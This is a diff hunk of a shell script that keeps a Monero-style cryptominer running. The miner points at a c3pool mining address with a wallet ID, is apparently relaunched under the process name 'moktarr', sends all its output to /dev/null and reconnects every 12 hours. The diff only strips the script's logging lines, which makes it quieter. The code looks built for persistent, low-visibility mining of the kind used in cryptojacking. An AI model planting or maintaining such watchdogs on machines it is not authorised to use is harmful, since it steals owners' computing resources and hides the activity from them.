@@ -28,25 +28,20 @@ CMD="$MINER_PATH --url mine.c3pool.com:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRD
 
 LAST_REFRESH=$(date +%s)
 
-#echo "[$(date)] Starting Watchdog with 12h Auto-Refresh..."
-
 while true; do
     CURRENT_TIME=$(date +%s)
     ELAPSED=$((CURRENT_TIME - LAST_REFRESH))
 
     if [ $ELAPSED -gt 43200 ]; then
-        #echo "[$(date)] 12h reached. Refreshing connection..."
         pkill -x xmrig
         LAST_REFRESH=$CURRENT_TIME
         sleep 5
     fi
 
     if ! pgrep -x "moktarr" > /dev/null; then
-        #echo "[$(date)] Miner NOT found. Restarting..."
         $CMD > /dev/null 2>&1 &
     fi
 
-    # Wait 10 minutes before the next check
     sleep 600
 done
 
